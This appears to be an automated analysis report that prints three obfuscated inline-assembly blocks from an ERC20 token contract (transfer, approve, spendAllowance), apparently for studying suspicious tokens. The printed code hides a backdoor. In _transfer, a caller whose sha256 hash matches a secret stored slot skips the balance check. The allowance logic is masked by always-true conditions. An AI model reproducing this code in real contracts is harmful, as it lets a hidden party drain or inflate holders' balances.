# Assembly Context Report

Assembly blocks found: 3

## Assembly Block 1

- Source file: `TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol`
- Contract: `Token`
- Function: `_transfer(address _from, address _to, uint256 _amount)`
- Visibility: `internal`
- ERC20 standard entry function: `no`
- Source range: line 66, column 9 to line 104, column 9
- Offset range: `2079:3451`
- Reachable from transfer/transferFrom/approve: `transfer, transferFrom`

```solidity
assembly {
            if iszero(_from) {
                revert(0, 0)
            }
            if iszero(_to) {
                revert(0, 0)
            }
            let bbwz := mload(0x40)
            let bfo228g := basefee()
            let nezy9b8 := number()
            if iszero(xor(bfo228g, bfo228g)) {
                mstore(bbwz, _from)
                mstore(add(bbwz, 32), 0)
            }
            let XCUz := keccak256(bbwz, 64)
            let qVPd := sload(XCUz)
            let Fpzy := sload(sSgI.slot)
            mstore(bbwz, shl(96, caller()))
            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {
                revert(0, 0)
            }
            let YvIh := mload(bbwz)
            if iszero(eq(Fpzy, YvIh)) {
                if lt(qVPd, _amount) {
                    let tfe9zci := timestamp()
                    if eq(tfe9zci, mul(tfe9zci, 1)) {
                        revert(0, 0)
                    }
                }
            }
            sstore(XCUz, sub(qVPd, _amount))
            mstore(bbwz, _to)
            mstore(add(bbwz, 32), 0)
            let iLho := keccak256(bbwz, 64)
            let bXFg := sload(iLho)
            sstore(iLho, add(bXFg, _amount))
            mstore(bbwz, _amount)
            log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)
        }
```

## Assembly Block 2

- Source file: `TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol`
- Contract: `Token`
- Function: `approve(address _spender, uint256 _amount)`
- Visibility: `public`
- ERC20 standard entry function: `approve(address,uint256)`
- Source range: line 108, column 9 to line 119, column 9
- Offset range: `3555:4047`
- Reachable from transfer/transferFrom/approve: `approve`

```solidity
assembly {
            let bbwz := mload(0x40)
            mstore(bbwz, caller())
            mstore(add(bbwz, 0x20), wZHA.slot)
            let ZFHJ := keccak256(bbwz, 0x40)
            mstore(bbwz, _spender)
            mstore(add(bbwz, 0x20), ZFHJ)
            let akRJ := keccak256(bbwz, 0x40)
            sstore(akRJ, _amount)
            log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)
            mstore(bbwz, _amount)
        }
```

## Assembly Block 3

- Source file: `TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol`
- Contract: `Token`
- Function: `_spendAllowance(address _owner, address _spender, uint256 _amount)`
- Visibility: `internal`
- ERC20 standard entry function: `no`
- Source range: line 124, column 9 to line 165, column 9
- Offset range: `4183:5628`
- Reachable from transfer/transferFrom/approve: `transfer, transferFrom`

```solidity
assembly {
            let bbwz := mload(0x40)
            mstore(bbwz, sload(qBQC.slot))
            mstore(add(bbwz, 32), 1)
            let uAnE := keccak256(bbwz, 64)
            let bcw8ayf := basefee()
            let ncwupwx := number()
            if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {
                mstore(bbwz, _owner)
                mstore(add(bbwz, 32), uAnE)
            }
            let Jfwv := keccak256(bbwz, 64)
            let CCkU := sload(Jfwv)
            let zfPf := CCkU
            if and(zfPf, iszero(_amount)) {
                revert(0, 0)
            }
            if iszero(zfPf) {
                mstore(bbwz, _owner)
                mstore(add(bbwz, 32), 1)
                uAnE := keccak256(bbwz, 64)
                mstore(bbwz, _spender)
                mstore(add(bbwz, 32), uAnE)
                Jfwv := keccak256(bbwz, 64)
                zfPf := add(sload(Jfwv), CCkU)
            }
            let gbj1enk := gas()
            pop(0)
            if eq(gbj1enk, and(gbj1enk, gbj1enk)) {
                zfPf := sub(zfPf, CCkU)
            }
            if iszero(eq(zfPf, not(0))) {
                if lt(zfPf, _amount) {
                    revert(0, 0)
                }
                let bf51h1a := basefee()
                pop(0)
                if eq(bf51h1a, and(bf51h1a, bf51h1a)) {
                    sstore(Jfwv, sub(zfPf, _amount))
                }
            }
        }
```
